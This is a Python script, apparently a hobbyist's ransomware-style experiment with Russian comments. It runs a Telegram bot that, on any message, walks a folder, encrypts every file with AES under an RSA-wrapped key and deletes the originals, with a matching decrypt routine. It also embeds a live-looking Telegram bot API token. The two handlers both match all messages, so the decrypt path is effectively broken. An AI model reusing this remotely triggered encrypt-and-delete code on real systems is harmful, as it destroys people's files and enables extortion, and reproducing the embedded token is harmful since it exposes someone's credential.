from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import sys
import telebot

bot = telebot.TeleBot('1020923679:AAH0ptmo12lbcN94Q052L-x25XMWGLtDjI8')

answer_encrypt = 'Шифрование выполнено успешно.'
answer_decrypt = 'Дешифрование выполнено успешно.'

message = 'encrypt'
message1 = 'decrypt'

# шифрование файлов

@bot.message_handler(func=lambda message: True)
def bot_enc(message: message):
        bot.reply_to(message, answer_encrypt)

        def en_crypt(file):
            f = open(file, "rb")
            data = f.read()
            f.close()
            file_out = open(str(file)+".bin", "wb")
            recipient_key = RSA.import_key(open(
                "C:\\Users\\Romanus\\Desktop\\Python and Progs\\python\\RSA\\keys\\Public.pem").read())
            session_key = get_random_bytes(16)
            cipher_rsa = PKCS1_OAEP.new(recipient_key)
            enc_session_key = cipher_rsa.encrypt(session_key)
            cipher_aes = AES.new(session_key, AES.MODE_EAX)
            ciphertext, tag = cipher_aes.encrypt_and_digest(data)
            [file_out.write(x)
             for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
            print(file + " encrypt")
            os.remove(file)

        def walk_for_encrypt(dir):
            for name in os.listdir(dir):
                path = os.path.join(dir, name)
                if os.path.isfile(path):
                    en_crypt(path)
                else:
                    walk_for_encrypt(path)
        # Зашифровано
        walk_for_encrypt(
            "C:\\Users\\Romanus\\Desktop\\Python and Progs\\python\\RSA\\test_crypt")
        print("--------------------------все файлы зашифрованы-------------------------------------")

# дешифрование файлов
@bot.message_handler(func=lambda message: True)
def bot_dec(message: message1):
    bot.reply_to(message1, answer_decrypt)

    def de_crypt(file):
        file_in = open(file, "rb")
        file_out = open(str(file[:-4]), "wb")
        private_key = RSA.import_key(open(
            "C:\\Users\\Romanus\\Desktop\\Python and Progs\\python\\RSA\\keys\\Private.pem").read())
        enc_session_key, nonce, tag, ciphertext = \
            [file_in.read(x)
             for x in (private_key.size_in_bytes(), 16, 16, -1)]
        file_in.close()  # была ошибка в файле, при расшифровке создавал новый, а старый не удалял как задумано, нужно было закрыть до os.remove т.к это удалило бы зашифрованный подлинник, но происходила ошибка, и она не удалялась. Допер сам частично, гугл в помощь... :) UDP: яркий пример поче нужно закрывать файлы, ВСЕГДА!
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
        file_out.write(data)
        print(file + " decrypt")
        os.remove(file)

    def walk_for_decrypt(dir):
        for name in os.listdir(dir):
            path = os.path.join(dir, name)
            if os.path.isfile(path):
                de_crypt(path)
            else:
                walk_for_decrypt(path)
    # Запуск функции расшифровки.
    walk_for_decrypt(
        "C:\\Users\\Romanus\\Desktop\\Python and Progs\\python\\RSA\\test_crypt")
    print("----------------------все файлы расшифрованы-----------------------------------------")


bot.polling()
